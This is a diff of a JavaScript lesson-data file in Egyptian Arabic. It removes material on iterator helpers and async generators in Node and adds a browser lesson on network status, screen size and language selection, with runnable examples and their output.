-const concat = Iterator.concat ?? ((...iterables) => Iterator.from((function* () { for (const it of iterables) yield* it; })()));
-console.log(concat(a(), [3, 4], new Set([5])).toArray());
-~~~
-
-~~~text الناتج (Node 24.22)
-[ 1, 2, 3, 4, 5 ]
-~~~
-
-[[??]] بيستخدم الأصلي لو موجود. والبديل generator بـ [[yield*]] على كل iterable، والفرق الوحيد إنه بيقبل strings.
-
----
-
-## ٧. إمتى الـ lazy بيكسب: اتقاس
-
-| الحالة | array methods | iterator helpers |
-|---|---|---|
-| مليون رقم array جاهزة، كلها (map و filter و reduce) | حوالي 30ms | حوالي 40ms، و [[for...of]] حوالي 13ms |
-| مليون رقم array جاهزة، أول 5 بس | 21.7ms ومليون نداء لـ [[map]] | 0.1ms و 13 نداء |
-| ٢ مليون object من generator، فلتر وجمع | 164ms و 244 MB (لازم [[Array.from]] الأول) | 89ms و 64 MB |
-| ٢ مليون object من generator، أول 5 | الذاكرة زادت 144.5 MB | الذاكرة زادت 0.1 MB |
-
-القاعدة: الـ helpers مش «أسرع»، هي «مبتعملش شغل مش محتاجه». لو محتاج كل حاجة والداتا في الذاكرة، الـ array أو [[for...of]].
-
----
-
-## الخلاصة
-
-- [[map]] و [[filter]] و [[take]] و [[drop]] و [[flatMap]] lazy وبيرجّعوا iterator.
-- [[toArray]] و [[reduce]] و [[forEach]] بيلفوا للآخر، و [[some]] و [[every]] و [[find]] بيقفوا بدري ويقفلوا المصدر.
-- [[Iterator.from]] لأي iterable أو object بـ [[next]]، و [[Iterator.concat]] لسلسلة مصادر (مع بديل في Node).
-- الـ iterator بيتستهلك مرة، والـ helpers مش على الـ async iterators.`,
-          lines: [
-            R`generator لانهائي: 1 و 2 و 3... من غير آخر. مبيحسبش غير لما حد يطلب.`,
-            R`عدّاد بيعرّفنا [[map]] اتنادت كام مرة فعلًا.`,
-            R`السلسلة: [[map]] بتربّع (وبتعدّ)، و [[filter]] بتسيب الفردي ([[n % 2]] بـ 1 truthy)، و [[take(3)]] أول ٣، و [[toArray]] هي اللي بتبدأ الطلب.`,
-            R`[[[ 1, 9, 25 ]]] و [[calls 5]]: الأرقام من 1 لـ 5 بس اتحسبت.`,
-            R`[[Map]] فيه منتجات وكمياتها، منهم واحد كميته صفر.`,
-            R`[[entries()]] iterator، فلترنا الكمية الأكبر من صفر وخدنا المفتاح: [[[ 'tea', 'rice' ]]].`,
-            R`دالة بترجّع iterator جديد كل مرة، لأن الـ iterator بيتستهلك.`,
-            R`[[drop(1)]] اتخطى 5 و [[take(3)]] خد 12 و 8 و 130، و [[reduce]] جمع الكل من صفر: 199.`,
-            R`[[some]] لقى 130 فـ [[true]]، و [[every]] كلهم أكبر من 1 فـ [[true]]، و [[find]] أول واحد أكبر من 10: 12.`,
-            R`[[flatMap]] رجّع الـ array اللي في كل عنصر، وطلّع قيمها: [[[ 1, 2, 3 ]]].`,
-            R`عدّاد لـ iterator «قديم» مكتوب بإيدنا.`,
-            R`object عنده [[next]] بس، ومش بيورث من [[Iterator.prototype]]، فمعندوش [[map]].`,
-            R`[[Iterator.from]] لفّه وادّاله الـ helpers: [[[ 10, 20, 30 ]]]، و [[Iterator.concat]] مش موجود في Node 24.22 فـ [[undefined]].`,
-          ],
-          ref: [
-            { t: "MDN: Iterator", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator" },
-            { t: "MDN: Iterator.from()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/from" },
-            { t: "MDN: Iterator.concat()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/concat" },
-            { t: "MDN: Iterator.prototype.map()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/map" },
-            { t: "MDN: Iterator.prototype.filter()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/filter" },
-            { t: "MDN: Iterator.prototype.flatMap()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/flatMap" },
-            { t: "MDN: Iterator.prototype.reduce()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/reduce" },
-            { t: "MDN: Iterator.prototype.some()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/some" },
-            { t: "MDN: Iterator.prototype.every()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/every" },
-            { t: "MDN: Iterator.prototype.find()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/find" },
-            { t: "MDN: Iterator.prototype.take()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/take" },
-            { t: "MDN: Iterator.prototype.drop()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/drop" },
-            { t: "MDN: Iterator.prototype.forEach()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/forEach" },
-            { t: "MDN: Iterator.prototype.toArray()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/toArray" },
-          ],
-          pre: ["js/iteration protocols: next و return و throw", { to: "js/map و filter و reduce", why: R`نفس الـ methods على الـ arrays` }, "js/Generator: next و return و throw و yield*"],
-        },
-        {
-          cmd: "AsyncIterator و async generators: for await بعمق",
-          title: "Symbol.asyncIterator و async generators: next و return و throw بترجّع Promises، و for await على صفحات API وعلى ملف، والتنضيف لما تخرج بدري",
-          desc: R`نفس بروتوكول الـ iteration بس كل خطوة Promise: الـ **async iterable** عنده [[ [Symbol.asyncIterator]() ]] بترجّع **async iterator**، و [[next()]] بترجّع **Promise** لـ [[{ value, done }]]. و [[for await...of]] بيستنى كل Promise قبل اللفة الجاية، وبينادي [[return()]] لو خرجت بدري زي [[for...of]] بالظبط.
-
-والـ **async generator** ([[async function*]]) أسهل طريقة تعمل واحد: جواه [[await]] و [[yield]] مع بعض، والـ object اللي بيرجع ([[[object AsyncGenerator]]]) عنده [[next]] و [[return]] و [[throw]] كلهم بيرجّعوا Promises، والطلبات بتقف في طابور لو ناديتهم من غير ما تستنى.
-
-و [[AsyncIterator.prototype]] (مش global، بتوصله من الـ prototype chain) هو أبو كل الـ async iterators، وعليه [[ [Symbol.asyncIterator]() { return this } ]] بس، **من غير** helpers زي [[map]]. وفي Node: الـ streams و [[readline]] و [[events.on]] و [[fs.opendir]] و [[timers/promises]] كلهم async iterables.`,
-          example: R`// async generator: صفحات من API، و for await بيقفل لما تخرج بدري
-const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-async function fetchPage(page) { await sleep(20); return { items: [page * 10 + 1, page * 10 + 2], next: page < 3 ? page + 1 : null }; }
-async function* allItems() {
-  let page = 1;
-  try {
-    while (page) {
-      const data = await fetchPage(page);
-      console.log('  جبت صفحة', page);
-      yield* data.items;
-      page = data.next;
-    }
-  } finally { console.log('  اتقفل'); }
+- [[var]] و [[function]] اللي برّه أي block بيتحطوا على [[window]]، و [[let]] لأ.
+- [[name]] خاصية جاهزة على [[window]] بتحوّل أي قيمة لنص، فـ [[name]] بقت [["42"]] و [[=== 42]] بقت [[false]]. ولو السكربت [[type="module"]] كان [[window.shopName]] كمان [[undefined]] و [[name]] متغيّر عادي رقمه ٤٢.` },
+            { lvl: 'تطبيق', t: R`**ابني:** شارة فوق الصفحة بتقول «متصل» بالأخضر، ولما النت يقطع تبقى حمرا ومكتوب «انت أوفلاين، التعديلات هتتحفظ لما النت يرجع». وتحتها مقاس الشاشة (يتحدث مع [[resize]]) و [[devicePixelRatio]] ولغات المتصفح. اختبرها من DevTools: Network ثم Offline (من قسمي ١ و ٢ في الشرح).`, done: R`لما تختار Offline الشارة بتحمر من غير reload، ولما ترجّع No throttling بتخضر، والمقاس بيتغيّر وانت بتصغّر الشباك.`, sol: R`~~~live 230 شارة النت والمقاس
+<style>
+  body { font: 16px/1.6 system-ui, sans-serif; margin: 16px; }
+  #net { display: inline-block; padding: 4px 12px; border-radius: 999px; color: #fff; background: #0b6e4f; }
+  #net.off { background: #b42318; }
+  dl { display: grid; grid-template-columns: auto 1fr; gap: 4px 12px; }
+  dt { font-weight: 700; }
+</style>
+<p id="net" role="status">متصل</p>
+<dl>
+  <dt>العرض × الطول</dt><dd id="size"></dd>
+  <dt>devicePixelRatio</dt><dd id="dpr"></dd>
+  <dt>لغات المتصفح</dt><dd id="langs"></dd>
+</dl>
+<script>
+const net = document.querySelector("#net");
+function showNet() {
+  net.textContent = navigator.onLine ? "متصل" : "انت أوفلاين، التعديلات هتتحفظ لما النت يرجع";
+  net.classList.toggle("off", !navigator.onLine);
 }
-for await (const item of allItems()) { console.log(item); if (item === 21) break; }
-const it = allItems();
-console.log(it[Symbol.asyncIterator]() === it, Object.prototype.toString.call(it));
-const first = it.next();
-console.log(first instanceof Promise, await first, await it.return('stop'), await it.next());
-console.log(await Array.fromAsync(allItems()));`,
-          try: R`اعمل ملف فيه ٢٠٠ ألف سطر ([[line 1]] لحد [[line 200000]])، واقراه بـ [[readline.createInterface]] على [[fs.createReadStream]] و [[for await]]، واعمل [[break]] عند [[line 3]]. بعدها اطبع [[input.bytesRead]] و [[input.destroyed]] و [[input.closed]] على طول وبعد ثانية: الملف اتقفل؟ وبعدين لف نفس القراية في [[async function* readLines(file)]] فيها [[finally]] بتقفل الـ stream بإيدك، وقيس تاني.`,
-          sol: R`~~~js readline-trap.mjs
-import { createReadStream, writeFileSync, statSync } from 'node:fs';
-import { createInterface } from 'node:readline';
-writeFileSync('lines.txt', Array.from({ length: 200000 }, (_, i) => 'line ' + (i + 1)).join('\n'));
-console.log('حجم الملف', statSync('lines.txt').size);
-const input = createReadStream('lines.txt', { encoding: 'utf8' });
-const rl = createInterface({ input, crlfDelay: Infinity });
-for await (const line of rl) { if (line === 'line 3') break; }
-for (const ms of [0, 1000]) {
-  await new Promise((r) => setTimeout(r, ms));
-  console.log('بعد ' + ms + 'ms: bytesRead=' + input.bytesRead + ' destroyed=' + input.destroyed + ' closed=' + input.closed);
+addEventListener("online", showNet);
+addEventListener("offline", showNet);
+function showSize() {
+  document.querySelector("#size").textContent = innerWidth + " × " + innerHeight;
+  document.querySelector("#dpr").textContent = devicePixelRatio;
 }
+addEventListener("resize", showSize);
+document.querySelector("#langs").textContent = navigator.languages.join("، ");
+showNet();
+showSize();
+</script>
 ~~~
 
-~~~text الناتج (Node 24.22)
-حجم الملف 2288894
-بعد 0ms: bytesRead=131072 destroyed=false closed=false
-بعد 1000ms: bytesRead=131072 destroyed=false closed=false
+~~~text الناتج (Chrome 157 من سيرفر محلي، النت اتقطع من Playwright وبعدين المقاس اتغيّر لـ 360)
+start:   متصل | 1280 × 720 | en-US، en
+offline: انت أوفلاين، التعديلات هتتحفظ لما النت يرجع  (class="off")
+online:  متصل
+resized: 360 × 640
 ~~~
 
-**المفاجأة:** الـ [[break]] قفل الـ [[readline]] بس. الـ file stream وقف عند 131072 بايت (chunkين) بس **فضل مفتوح**: [[closed=false]] حتى بعد ثانية، يعني الـ file handle لسه ماسكه البرنامج. في سيرفر بيقرا ملفات كتير ده تسريب file descriptors لحد ما يقع بـ [[EMFILE]]. ولو فيه أي حد تاني سامع لـ event [[data]] على نفس الـ stream (عدّاد بايتات مثلًا)، الـ stream بيفضل شغال ويقرا الملف **كله** رغم الـ [[break]]: جرّبتها بعدّاد على [[data]] و [[highWaterMark: 1024]] على ملف 35 MB، والعدّاد وصل 35199122 من 35199122.
-
-~~~js read-lines.mjs
-import { createReadStream } from 'node:fs';
-import { createInterface } from 'node:readline';
-let input;
-async function* readLines(file) {
-  input = createReadStream(file, { encoding: 'utf8' });
-  const rl = createInterface({ input, crlfDelay: Infinity });
-  try { yield* rl; }
-  finally { rl.close(); input.destroy(); }
-}
-for await (const line of readLines('lines.txt')) { if (line === 'line 3') break; }
-await new Promise((r) => setTimeout(r, 50));
-console.log('بعد 50ms: bytesRead=' + input.bytesRead + ' destroyed=' + input.destroyed + ' closed=' + input.closed);
-~~~
-
-~~~text الناتج (Node 24.22)
-بعد 50ms: bytesRead=65536 destroyed=true closed=true
-~~~
-
-- [[yield* rl]] جوه async generator بيلف على أي async iterable (الـ readline هنا) ويطلّع سطوره.
-- الـ [[break]] برّه نادى [[return()]] على الـ generator، والـ [[return]] وصلت لمكان الـ [[yield*]]، فالـ [[finally]] اشتغلت: [[input.destroy()]] قفل الملف ([[closed=true]]) بعد chunk واحد.
-- [[crlfDelay: Infinity]] عشان [[\r\n]] بتاعة ويندوز تتحسب نهاية سطر واحدة.
-- [[let input]] برّه الدالة هنا بس عشان نطبع حالته في الآخر؛ في الكود الحقيقي خليه جوه.`,
-          practice: [
-            { lvl: 'سريع', t: R`**اقرا وتوقّع:** ٤ نداءات [[next()]] ورا بعض **من غير** [[await]] على async generator فيه ٣ قيم، كل واحدة بعد 30ms. إيه اللي هيتطبع بالترتيب؟ وكام [[start]] هيتطبع قبل [[طلبت ٤]]؟
-
-~~~js
-const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-async function* slow() {
-  for (let i = 1; i <= 3; i++) { console.log('  start', i); await sleep(30); yield i; }
-}
-const g = slow();
-const p1 = g.next(), p2 = g.next(), p3 = g.next(), p4 = g.next();
-console.log('طلبت ٤');
-console.log(await Promise.all([p1, p2, p3, p4]));
-~~~`, done: R`توقّعت إن [[start 1]] بيتطبع **قبل** [[طلبت ٤]]، وإن النتايج بالترتيب ومفيش قيمة اتكررت، والرابعة [[done: true]].`, sol: R`~~~text الناتج (Node 24.22)
-  start 1
-طلبت ٤
-  start 2
-  start 3
-[
-  { value: 1, done: false },
-  { value: 2, done: false },
-  { value: 3, done: false },
-  { value: undefined, done: true }
-]
-~~~
-
-- أول [[next()]] بيشغّل الـ generator **في نفس اللحظة** لحد أول [[await]]، فـ [[start 1]] اتطبع قبل السطر اللي بعده.
-- الـ ٣ نداءات التانية **مبتشغّلش** الـ generator بالتوازي: بتقف في طابور جوه الـ AsyncGenerator، وكل واحد بيستنى اللي قبله يخلص. فـ [[start 2]] جه بعد ما الأولى خلصت.
-- [[Promise.all]] رجّع النتايج بالترتيب. ده بيضمن إن الـ async generator عمره ما يشتغل مرتين في نفس الوقت (عكس الـ sync generator اللي بيرمي [[Generator is already running]]).` },
-            { lvl: 'تطبيق', t: R`**ابني:** [[class Ticker]] async iterable **من غير generator**: [[ [Symbol.asyncIterator]() ]] بترجّع object فيه [[next()]] بترجّع Promise بتتحل بعد [[ms]] بالرقم الجاي لحد [[max]]، و [[return()]] بتلغي الـ timer وتطبع. جرّبها بـ [[for await]] و [[break]] عند 3، وبـ [[Array.fromAsync]].`, done: R`بيطبع [[tick 1]] و [[2]] و [[3]] وبعدين «ticker اتقفل بعد 3»، و [[Array.fromAsync(new Ticker(5, 3))]] بـ [[[ 1, 2, 3 ]]] من غير ما [[return]] تتنادى.`, sol: R`~~~js ticker.mjs
-class Ticker {
-  constructor(ms, max) { this.ms = ms; this.max = max; }
-  [Symbol.asyncIterator]() {
-    let count = 0, timer = null;
-    const { ms, max } = this;
-    return {
-      next() {
-        if (count >= max) return Promise.resolve({ value: undefined, done: true });
-        return new Promise((resolve) => { timer = setTimeout(() => resolve({ value: ++count, done: false }), ms); });
-      },
-      return() {
-        clearTimeout(timer);
-        console.log('  ticker اتقفل بعد', count);
-        return Promise.resolve({ value: undefined, done: true });
-      },
-      [Symbol.asyncIterator]() { return this; },
-    };
+- **[[role="status"]]** بيخلي قارئ الشاشة يقول التغيير لوحده.
+- **[[showNet()]] و [[showSize()]] في الآخر:** الأحداث بتيجي مع التغيير بس، فلازم تعرض الحالة الأولى بإيدك.
+- **جرّب زرار «موبايل» فوق الصفحة الحية:** المقاس بيتغيّر لأن الـ iframe اتغيّر عرضه ([[resize]] بيتنده جوه الـ iframe كمان).` },
+            { lvl: 'تطبيق', t: R`**ابني:** [[pickLang(languages, supported = ["ar", "en"], fallback = "ar")]] بتلف على [[navigator.languages]] بالترتيب وترجّع أول لغة موقعك بيدعمها (من غير المنطقة: [["ar-EG"]] تبقى [["ar"]])، ولو مفيش ترجّع الاحتياطي. جرّبها في Node 24 على ٥ لستات وعلى [[navigator.languages]] نفسه (من قسم ٢ في الشرح).`, done: R`[[["ar-EG","en"]]] بترجّع [["ar"]]، و [[["fr-FR","en-US","ar"]]] بترجّع [["en"]] (الترتيب مهم)، والفاضية والألماني بيرجّعوا [["ar"]]، و [[["EN-gb"]]] بترجّع [["en"]].`, sol: R`~~~js pick-lang.js
+// pick-lang.js: اختار لغة الموقع من لغات المتصفح
+function pickLang(languages, supported = ["ar", "en"], fallback = "ar") {
+  for (const tag of languages) {
+    const base = tag.toLowerCase().split("-")[0];
+    if (supported.includes(base)) return base;
   }
+  return fallback;
 }
-for await (const t of new Ticker(20, 5)) { console.log('tick', t); if (t === 3) break; }
-console.log(await Array.fromAsync(new Ticker(5, 3)));
+console.log(pickLang(["ar-EG", "en"]));
+console.log(pickLang(["fr-FR", "en-US", "ar"]));
+console.log(pickLang(["de-DE"]));
+console.log(pickLang([]));
+console.log(pickLang(["EN-gb"]));
+console.log(typeof navigator, navigator.language, pickLang(navigator.languages));
 ~~~
 
-~~~text الناتج (Node 24.22)
-tick 1
-tick 2
-tick 3
-  ticker اتقفل بعد 3
-[ 1, 2, 3 ]
+~~~text الناتج (node pick-lang.js، Node 24.22)
+ar
+en
+ar
+ar
+en
+object en-US en
 ~~~
 
-**الشرح:** ده البروتوكول من غير سكر: [[Ticker]] **iterable** (كل [[for await]] بياخد iterator جديد بعدّاد جديد)، والـ object اللي بيرجع **iterator**: [[next]] و [[return]] بيرجّعوا Promises. [[ [Symbol.asyncIterator]() { return this; } ]] على الـ iterator نفسه عشان ينفع يتلف عليه مباشرة (زي ما [[AsyncIterator.prototype]] بيعمل). و [[return]] بتلغي الـ timer: من غيرها، لو حد عمل [[break]] والـ [[setTimeout]] شغال، البرنامج يفضل عايش لحد ما يخلص.` },
-            { lvl: 'تطبيق', t: R`**ابني:** الـ async iterators معندهمش [[map]] ولا [[take]]. اكتب [[async function* mapAsync(source, fn)]] (الـ [[fn]] ممكن تبقى async) و [[async function* takeAsync(source, n)]]، وركّبهم على async generator لانهائي، واتأكد إن المصدر **اتقفل** في الآخر.`, done: R`[[takeAsync(mapAsync(numbers(log), async (x) => x * 2), 3)]] بيرجّع [[[ 2, 4, 6 ]]]، والـ [[log]] فيه [[gen 1]] و [[gen 2]] و [[gen 3]] وبعدين [[source closed]]، ومفيش [[gen 4]].`, sol: R`~~~js async-helpers.mjs
-async function* mapAsync(source, fn) {
-  for await (const x of source) yield await fn(x);
-}
-async function* takeAsync(source, n) {
-  if (n <= 0) return;
-  let i = 0;
-  for await (const x of source) { yield x; if (++i >= n) return; }
-}
-async function* numbers(log) {
-  try { for (let i = 1; ; i++) { log.push('gen ' + i); yield i; } } finally { log.push('source closed'); }
-}
-const log = [];
-const doubled = takeAsync(mapAsync(numbers(log), async (x) => x * 2), 3);
-console.log(await Array.fromAsync(doubled), log.join(' | '));
-~~~
-
-~~~text الناتج (Node 24.22)
-[ 2, 4, 6 ] gen 1 | gen 2 | gen 3 | source closed
-~~~
-
-**الشرح:** القفل بيمشي في السلسلة لوحده: [[takeAsync]] عمل [[return]] بعد التالت → الـ [[for await]] اللي جواه قفل [[mapAsync]] (نادى [[return]]) → [[for await]] اللي جوه [[mapAsync]] قفل [[numbers]] → الـ [[finally]] اشتغلت. ومهم: [[if (++i >= n) return]] **بعد** الـ [[yield]] مش قبل الـ [[for await]] الجاية، وإلا هتطلب قيمة زيادة من المصدر قبل ما تقف ([[gen 4]] كانت هتظهر). و [[n <= 0]] بيرجع على طول من غير ما يلمس المصدر.` },
-            { lvl: 'تحدي', t: R`**دوّر بنفسك:** من وثائق Node، لاقي ٣ APIs (غير الـ streams و [[readline]]) بيرجّعوا async iterable، واكتب سكربت بيستخدم التلاتة بـ [[for await]] ومعاه [[break]] أو نهاية طبيعية، وبيتأكد إن مفيش حاجة فضلت شغالة بعدها (listeners أو timers).`, done: R`السكربت بيستخدم [[fs/promises.opendir]] و [[timers/promises.setInterval]] و [[events.on]]، وبيطبع أسامي الملفات، و 3 ticks، و [[listeners بعد break: 0]]، والبرنامج بيخلص لوحده.`, sol: R`~~~js node-async-iterables.mjs
-import { opendir, mkdir, writeFile, rm } from 'node:fs/promises';
-import { setInterval as every } from 'node:timers/promises';
-import { on, EventEmitter } from 'node:events';
-await mkdir('demo-dir', { recursive: true });
-for (const f of ['a.txt', 'b.txt', 'c.log']) await writeFile('demo-dir/' + f, f);
-const names = [];
-for await (const entry of await opendir('demo-dir')) names.push(entry.name);
-console.log('opendir:', names.sort());
-let ticks = 0;
-for await (const startedAt of every(10, 'tick')) { ticks++; if (ticks === 3) break; }
-console.log('timers/promises setInterval:', ticks);
-const ee = new EventEmitter();
-setTimeout(() => { ee.emit('order', 1); ee.emit('order', 2); ee.emit('order', 3); }, 5);
-for await (const [id] of on(ee, 'order')) { console.log('order', id); if (id === 2) break; }
-console.log('listeners بعد break:', ee.listenerCount('order'));
-await rm('demo-dir', { recursive: true });
-~~~
-
-~~~text الناتج (Node 24.22)
-opendir: [ 'a.txt', 'b.txt', 'c.log' ]
-timers/promises setInterval: 3
-order 1
-order 2
-listeners بعد break: 0
-~~~
-
-**اللي اتعلّمناه من الوثائق:**
-- [[opendir]] بيرجّع [[Dir]]، و [[for await]] عليه بيقرا الفولدر entry entry (أحسن من [[readdir]] للفولدرات الضخمة) وبيقفل الـ [[Dir]] لوحده في الآخر.
-- [[setInterval]] من [[node:timers/promises]] async iterable لانهائي، والـ [[break]] بيلغي الـ interval (من غيره البرنامج مكنش هيخلص).
-- [[events.on(emitter, name)]] بيحوّل event لـ async iterable، وكل قيمة **array** بالـ arguments ([[[id]]])، والـ [[break]] بيشيل الـ listener (العدّاد 0)، ولو الـ emitter عمل [[error]] بيترمي جوه الـ loop.
-- رتّبنا [[names]] بـ [[sort()]] لأن ترتيب [[opendir]] مش مضمون.` },
-            { lvl: 'تحدي', t: R`**قارن وقيس:** ٥ صفحات، كل واحدة بتاخد 100ms. هاتهم بـ ٣ طرق: async generator بيجيب صفحة صفحة و [[for await]]، و [[Promise.all]]، و async generator بيطلب **صفحتين قدام** (prefetch) وبيطلّع بالترتيب. قيس الوقت.`, done: R`عندك ٣ أرقام قريبة من 500ms و 100ms و 200ms، والـ prefetch طلّع الصفحات بالترتيب، وتقدر تقول إمتى تختار كل واحدة.`, sol: R`~~~js pages-speed.mjs
-const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-const fetchPage = async (n) => { await sleep(100); return 'page ' + n; };
-async function* pagesInOrder(count) { for (let n = 1; n <= count; n++) yield await fetchPage(n); }
-let t = performance.now();
-const a = [];
-for await (const p of pagesInOrder(5)) a.push(p);
-console.log('for await:', a.length, 'صفحات في', Math.round(performance.now() - t) + 'ms');
-t = performance.now();
-const b = await Promise.all([1, 2, 3, 4, 5].map(fetchPage));
-console.log('Promise.all:', b.length, 'صفحات في', Math.round(performance.now() - t) + 'ms');
-async function* pagesAhead(count, ahead = 2) {
-  const queue = [];
-  for (let n = 1; n <= count; n++) {
-    queue.push(fetchPage(n));
-    if (queue.length > ahead) yield await queue.shift();
-  }
-  while (queue.length) yield await queue.shift();
-}
-t = performance.now();
-const c = await Array.fromAsync(pagesAhead(5));
-console.log('prefetch 2:', c.join(','), Math.round(performance.now() - t) + 'ms');
-~~~
-
-~~~text الناتج (Node 24.22)
-for await: 5 صفحات في 545ms
-Promise.all: 5 صفحات في 106ms
-prefetch 2: page 1,page 2,page 3,page 4,page 5 217ms
-~~~
-
-**القراءة:**
-- **صفحة صفحة (545ms):** الأبطأ، بس الأخف على السيرفر، وبيقف فورًا لو اللي بيلف عمل [[break]]، ومناسب لما رقم الصفحة الجاية بييجي من رد الصفحة اللي قبلها (cursor) فمفيش طريقة توازي أصلًا.
-- **[[Promise.all]] (106ms):** الأسرع، بس لازم تعرف عدد الصفحات من الأول، وكلهم في الذاكرة مع بعض، و ١٠٠٠ صفحة = ١٠٠٠ request في نفس اللحظة.
-- **prefetch (217ms):** في النص: لحد ٣ requests شغالين (الحالية واتنين قدام)، والنتايج بالترتيب، ولسه async iterable. الفخ: لو request في الطابور اترفض قبل ما توصله، Node بيعتبره unhandled rejection؛ في كود حقيقي اعمل [[p.catch(() => {})]] على كل واحد في الطابور وانت بتحطه، وارمي الـ error لما توصل له بالـ [[await]].` },
-          ],
-          flag: "script",
-          deep: {
-            why: R`أغلب الداتا الحقيقية بتيجي «على مراحل» ومع انتظار: صفحات API، سطور ملف كبير، رسايل WebSocket، events، صفوف من قاعدة بيانات. الـ async iteration بيخليك تكتب ده كـ loop عادي بـ [[for await]]، بنفس قواعد القفل والـ [[break]]، بدل callbacks و events متلخبطة. والـ async generator بيخليك تعمل مصدر زي ده في كام سطر وتخبّي جواه الـ pagination والـ retry والتنضيف.`,
-            how: R`[[for await (const x of src)]]:
-1. بيدوّر على [[ src[Symbol.asyncIterator] ]]. لو مش موجود، بيدوّر على [[ src[Symbol.iterator] ]] ويلفّه (CreateAsyncFromSyncIterator)، فـ [[for await]] على array فيها Promises بيستنى كل واحدة. لو الاتنين مش موجودين: [[TypeError: {(intermediate value)} is not async iterable]].
-2. كل لفة: [[await it.next()]]، ولو [[done]] يقف.
-3. خروج بدري: [[await it.return()]] لو موجودة.
-
-الـ AsyncGenerator عنده طابور طلبات: كل [[next]] أو [[return]] أو [[throw]] بيرجّع Promise على طول وبيتحط في الطابور، والـ generator بيخدمهم واحد واحد. و [[yield]] جوه async generator بيعمل [[await]] على القيمة الأول (فـ [[yield promise]] بيطلّع قيمتها مش الـ Promise). و [[return(v)]] على generator واقف عند [[yield]] بيشغّل الـ [[finally]] (وممكن تعمل [[await]] جواها، زي قفل connection)، و [[throw(e)]] بيرمي مكان الـ [[yield]] زي الـ sync بالظبط بس النتيجة Promise.
-
-الـ prototype chain: [[allItems.prototype]] ← [[AsyncGenerator.prototype]] (عليه [[next]] و [[return]] و [[throw]]) ← [[AsyncIterator.prototype]] (عليه [[Symbol.asyncIterator]] و [[Symbol.asyncDispose]] بس) ← [[Object.prototype]]. و [[AsyncIterator]] مش global في Node 24 ([[typeof globalThis.AsyncIterator]] بـ [[undefined]]).`,
-            when: R`[[async function*]]: أي مصدر بيجيب داتا على دفعات (pagination، polling، قراية ملف وتحويله، استعلام قاعدة بيانات بـ cursor). [[for await]]: لما تستهلك واحد من دول بالترتيب، وكل عنصر محتاج يخلص قبل اللي بعده. [[Array.fromAsync]]: لما الكل صغير وعايزه array. [[ [Symbol.asyncIterator] ]] بإيدك: لما عندك class (queue، channel، socket) عايزها تتلف بـ [[for await]] من غير generator. ولو محتاج توازي (١٠ طلبات مع بعض) [[for await]] مش الأداة: [[Promise.all]] على دفعات (درس «async في loops»).`,
-            mistakes: R`- [[for await]] على readline وبعدين [[break]] ومستني الملف يتقفل: الـ file stream بيفضل مفتوح (اتقاس: [[closed=false]] بعد ثانية)، ولو فيه listener تاني على [[data]] بيقرا الملف كله. اقفله بإيدك في [[finally]].
-- [[for (const x of asyncGen())]] من غير [[await]]: [[TypeError: ticks is not a function or its return value is not iterable]].
-- [[for await]] برّه async function في CommonJS ([[.cjs]]): [[SyntaxError: Unexpected reserved word]]. في ESM ([[.mjs]]) مسموح top-level.
-- تفتكر [[next()]] كتير من غير [[await]] بيوازي: بيتطابروا.
-- تستخدم [[map]] أو [[take]] على async iterator: مش موجودين (الـ helpers للـ sync بس). استخدم async generator صغير أو [[Array.fromAsync]] بعد ما تحدّد العدد.
-- تنسى [[return]] في async iterator بإيدك ماسك timer أو socket: البرنامج ميقفلش بعد [[break]].
-- [[yield]] لـ Promise مرفوضة جوه async generator: بتترمي **جوه** الـ generator مكان الـ [[yield]]، مش كقيمة.
-- [[for await]] على مصادر محتاج توازي: هتاخد وقت مجموعهم مش وقت أبطأهم.`,
-          },
-          teach: R`## الفكرة في سطر
-
-نفس [[for...of]] و generators، بس كل قيمة جاية من Promise: [[for await]] بيستنى، و [[async function*]] بيـ [[await]] ويـ [[yield]]. الناتج من Node 24.22.
-
----
-
-## ١. [[Symbol.asyncIterator]]: البروتوكول
-
-| | sync | async |
-|---|---|---|
-| الـ method على الـ iterable | [[ [Symbol.iterator]() ]] | [[ [Symbol.asyncIterator]() ]] |
-| [[next()]] بترجّع | [[{ value, done }]] | Promise لـ [[{ value, done }]] |
-| [[return()]] و [[throw()]] | قيم | Promises |
-| اللي بيلف | [[for...of]] و spread و destructuring | [[for await...of]] و [[Array.fromAsync]] بس |
-| الـ generator | [[function*]] ← Generator | [[async function*]] ← AsyncGenerator |
-| الأب المشترك | [[Iterator.prototype]] بالـ helpers | [[AsyncIterator.prototype]] من غير helpers |
-
-مفيش spread ولا destructuring لـ async iterable: الاتنين sync ومينفعش يستنوا.
-
----
-
-## ٢. async generator بيجيب صفحات
-
-~~~js
-const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-async function fetchPage(page) { await sleep(20); return { items: [page * 10 + 1, page * 10 + 2], next: page < 3 ? page + 1 : null }; }
-async function* allItems() {
-  let page = 1;
-  try {
-    while (page) {
-      const data = await fetchPage(page);
-      console.log('  جبت صفحة', page);
-      yield* data.items;
-      page = data.next;
-    }
-  } finally { console.log('  اتقفل'); }
-}
-~~~
-
-- [[fetchPage]] بتمثّل API: كل صفحة فيها رقمين، و [[next]] رقم الصفحة الجاية لحد 3 وبعدين [[null]].
